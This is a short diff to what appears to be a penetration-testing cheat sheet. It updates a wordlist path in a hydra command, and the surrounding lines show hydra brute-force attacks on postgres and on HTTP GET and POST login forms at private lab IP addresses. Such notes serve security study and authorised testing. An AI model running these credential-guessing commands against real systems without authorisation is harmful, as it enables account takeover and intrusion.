@@ -657,7 +657,7 @@ hydra -L /usr/share/seclists/Passwords/UserPassCombo-Jay.txt -P /usr/share/secli
 hydra  -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://192.168.175.47 -t 4
 
 # hydra for HTTP
-hydra -l admin -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.172.61 http-get /login -f
+hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/2024-197_most_used_passwords.txt 192.168.172.61 http-get /login -f
 hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:usr=user&pwd=^PASS^:Login failed"
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.172.61 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:F=403' -f
 
